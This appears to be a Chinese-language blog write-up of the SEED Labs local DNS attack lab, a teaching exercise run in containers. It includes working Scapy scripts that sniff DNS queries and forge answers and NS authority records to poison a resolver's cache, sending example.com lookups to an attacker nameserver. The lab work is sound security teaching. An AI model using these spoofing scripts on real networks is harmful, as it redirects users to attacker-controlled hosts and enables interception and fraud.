---
title: Local-DNS-Attack-Lab
categories:
  - SeedLabs/NetworkSecurity
tags:
  - DNS
  - NetworkSecurity
abbrlink: 86d17afc
date: 2024-03-24 01:10:04
---

##  Lab Overview

DNS 域名系统是互联网的电话簿，负责主机名和 IP 地址的互相转化。这种转化是通过 DNS 解析在幕后进行的。DNS 攻击以各种方式操纵解析过程，将用户误导到恶意目的地。本实验专注于本地攻击，包括以下主题：

-   DNS 以及它是如何工作的
-   DNS 服务器设置
-   DNS 缓存污染攻击
-   欺骗 DNS 响应

## Lab Environment Setup Task

本次实现的环境设置如下，具有一个 DNS 服务器，一个 User 和一个 Attacker 以及一个 ns-Attacker。

![image-20240312214625126](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312214625126.png)

**攻击者容器**：配置共享文件夹、网络模式为主机模式，可以嗅探所有容器中的数据包。

**本地 DNS 服务器**：运行 BIND 9 程序，这是一个 DNS 服务器程序。BIND 9 从 /etc/bind/named.conf 中获取配置，这个文件是主配置文件，通常包括许多 include 条目，其中一个文件叫做 /etc/bind/named.conf.options，实际的配置信息被存储在这些包含的文件中。

-   **简化**：DNS 服务器在查询中使用随机化的源端口号，尽管这可以预测，为了简化实验，我们在配置文件中将源端口号固定位 33333。
-   **关闭 DNSSEC**：引入 DNSSEC 是为了防止 DNS 服务器上的欺骗攻击，我们关闭它以展示没有这种保护措施的攻击是如何工作的。
-   **DNS 缓存**：在攻击中，我们需要污染本地 DNS 服务器上的 DNS 缓存。其中 `rndc dumpdb -cache` 将缓存存储到文件 /var/cache/bind/dump.db，`rndc flush` 用于清空缓存。
-   **attacker32.com 转发区**：转发区是一种在 DNS 服务器上配置的机制，用于将特定域名的查询转发到指定的名称服务器（nameserver），该名称服务器托管在攻击者容器中。

**用户：**用户容器已经配置使用 10.9.0.53 作为本地 DNS 服务器。这是通过修改配置文件 /etc/resolv.conf 来实现的。

**攻击者的 NameServer**：在攻击者的名称服务器，我们有两个区域 zone。一个是合法的 attacker32.com，一个是虚假的 example.com。这些区域在 /etc/bind/named.conf 中配置。

## Testing the DNS Setup

**获取 ns.attacker32.com 的 IP 地址。**我们运行 `dig ns.attacker32.com` 由于 DNS 服务器添加了转发区域条目，因此结果来自 ns-Attacker 上设置的区域文件。

![image-20240312232324059](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232324059.png)

**获取 www.example. com 的 IP 地址。**两个命名服务器现在承载着 example.com 域名，一个是域名的官方命名服务器，另一个是攻击者容器。我们将查询这两个名称服务器，看看会得到什么样的响应。

我们发现使用 DNS 服务器得到的结果如下，这就是正确的 IP 地址。

![image-20240312232656499](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232656499.png)

使用在线 DNS 解析工具验证，可以发现这个结果来自互联网。

![image-20240312232823668](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232823668.png)

如果我们指定使用 ns-Attacker 来查询，那么结果就来自 ns-Attacker 的配置文件。

![image-20240312232905034](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240312232905034.png)

域名服务器缓存污染攻击的目的是让受害者向 ns.attacker32.com 询问 www.example.com 的 IP 地址。也就是说，只运行第一个 dig 命令，那个没有 @ 选项的命令，就可以从 ns-Attacker 那里得到假的结果。

## Task 1: Directly Spoofing Response to User

当用户在浏览器中键入网站名称如 www.example.com 时，用户的计算机将向本地 DNS 服务器发送 DNS 请求，以解析主机名称的 IP 地址。攻击者可以嗅到 DNS 请求消息，然后 他们可以立即创建一个假的 DNS 响应，并发送回用户机器。如果假回复比真回复早到达，它将被用户机接受。如果本地 DNS 服务器没有缓存，那么会向根 DNS 服务器请求，同样我们也可以创建一个假的 DNS 响应。

![image-20240313001650397](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313001650397.png)

构造的代码如下，其中：

-   id：标识一整个 DNS 会话，响应包需要的请求包相同。
-   qd：query domain，请求的域名，需要和请求包相同。
-   aa：Authoritative answer，1 表示包含权威答案。
-   rd：Recursive Desired，0 表示禁止递归查询。
-   qr： Query Response，表示是一个响应包。

```python
#!/usr/bin/env python3
from scapy.all import *
import sys
NS_NAME = "example.com"


def spoof_dns(pkt):
    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)  # Create an IP object
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)  # Create a UDP object
        # Create an aswer record
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname,
                       type='A', ttl=259200, rdata='1.2.3.5')
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                     qdcount=1, ancount=1, an=Anssec)  # Create a DNS object
        spoofpkt = IPpkt/UDPpkt/DNSpkt  # Assemble the spoofed DNS packet
        send(spoofpkt)


myFilter = "udp and dst port 53"  # Set the filter
pkt = sniff(iface='br-563e32bc5643', filter=myFilter, prn=spoof_dns)
```

执行结果如下，首先，清空本地 DNS 服务器的缓存。然后执行上述代码，在 User 容器执行 dig www.example.com，发现欺骗成功。可以看到，我们的程序构造了两个响应包，一个发送给了用户，一个发送给了本地的 DNS 服务器。（图里有四个是因为我执行了两次）

在缓存中，我们发现 DNS 中出现了 www.example.com 的缓存，用户查询的结果是一个假的地址，攻击成功。

![image-20240313001125261](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313001125261.png)

##  Task 2: DNS Cache Poisoning Attack – Spoofing Answers

已经实现了，就是不仅要欺骗用户，也要欺骗 DNS 服务器。

##  Task 3: Spoofing NS Records

上面我们只影响了一个主机名，接下来我们发起对整个 example.com 域名的攻击。在 DNS 答复中使用 Authority 部分。基本上，当我们欺骗一个回复，除了欺骗答案，我们添加以下权威部分。当这个条目被本地 DNS 服务器缓存时，ns.attacker32.com 将被用作命名服务器，以便将来查询 example.com 域中的任何主机名。

```
;; AUTHORITY SECTION:
example.com. 259200 IN NS ns.attacker32.com.
```

我们修改代码如下：

```python
Anssec = DNSRR(rrname=pkt[DNS].qd.qname,
               type='A', ttl=259200, rdata='1.2.3.5')
# The Authority Section
NSsec = DNSRR(rrname='example.com', type='NS',
              ttl=259200, rdata='ns.attacker32.com')
DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
             qdcount=1, ancount=1, nscount=1, an=Anssec, ns=NSsec)  # Create a DNS object
```

执行结果如下：

第一次执行捕获三个请求包，分别是 User 请求 Local DNS 服务器，Local DNS 服务器请求 Remote DNS 服务器，Local DNS 服务器请求 ns-Attacker 服务器。攻击也成功了，出现了我们构造的 NS 条目。后续请求 mail.example.com 时，直接请求的就是 ns-Attacker 服务器。

![image-20240313003731276](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313003731276.png)

##  Task 4: Spoofing NS Records for Another Domain

在上面，我们已经攻击了 example.com 的 DNS 缓存，接下来，我们拓展到其他的域名。因此，我们在 DNS 响应中，添加一个权威部分条目，代码如下：

```python
# The Authority Section
NSsec1 = DNSRR(rrname='example.com', type='NS',
               ttl=259200, rdata='ns.attacker32.com')
NSsec2 = DNSRR(rrname='baidu.com', type='NS',
               ttl=259200, rdata='ns.attacker32.com')
DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
             qdcount=1, ancount=1, nscount=2, an=Anssec, ns=NSsec1/NSsec2)  # Create a DNS object
```

执行结果如下，对用户攻击成功了，但是对 DNS 服务器攻击失败了。因为 DNS 服务器会去访问我们的 ns-Attacker 服务器，没有设置 baidu.com 的条目，因此就不会写入缓存。

![image-20240313005231690](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240313005231690.png)

## Task 5: Spoofing Records in the Additional Section

在 DNS 回复中，有一个叫做 Additional Section 的部分，用来提供额外的信息。实际上，它主要用于提供一些主机名的 IP 地址，特别是那些出现在 Authority 部分的主机名。这个任务的目的是欺骗本节中的一些条目，看看它们是否会被目标本地 DNS 服务器成功缓存。结果就是并没有缓存。

![image-20240314113753641](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240314113753641.png)